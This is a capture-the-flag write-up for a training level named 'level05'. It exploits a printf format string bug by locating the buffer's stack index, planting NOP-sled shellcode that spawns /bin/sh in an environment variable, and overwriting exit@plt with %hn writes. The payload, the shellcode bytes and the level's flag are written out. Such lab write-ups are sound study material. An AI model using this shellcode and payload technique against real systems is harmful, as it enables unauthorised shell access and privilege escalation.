# Level05
This program is just a fgets call on stdin, converts characters in the buffer from uppercase to lowercase and prints the buffer with printf.
Since the buffer is directly used in printf, we can use a format string exploit.

We search the index of the buffer in the stack:
```bash
for((i=0; i<200; i++)); do echo "Index $i" && ./level05 <<< "aaaa%$i\$x"; done | grep -B1 61616161
```

Which give us:
```
Index 10
aaaa61616161
```

We inject our shellcode in the environment:
```bash
export SHELLCODE=`python -c 'print("\x90" * 0xffff + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`
```

We can use this payload:
```bash
cat <(python -c 'print ("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%249x%10$hn" + "%65278x%11$hn")') - | ./level05
```

Explanation of the payload:
* "\xe0\x97\x04\x08" --> address of the high bytes of exit@plt
* "\xe2\x97\x04\x08" --> address of the low bytes of exit@plt
* "%249x%10$hn" --> write 0x0101 (0x101 = 0xf9(249) + 0x8) for the low address of our shellcode with index 10 ("\xe0\x97\x04\x08")
* "%65278x%11$hn" --> write 0xffff (0xffff = 0xfefe(65278) + 0x0101) for the high address of our shellcode with index 11 ("\xe2\x97\x04\x08")

Flag is **h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq**
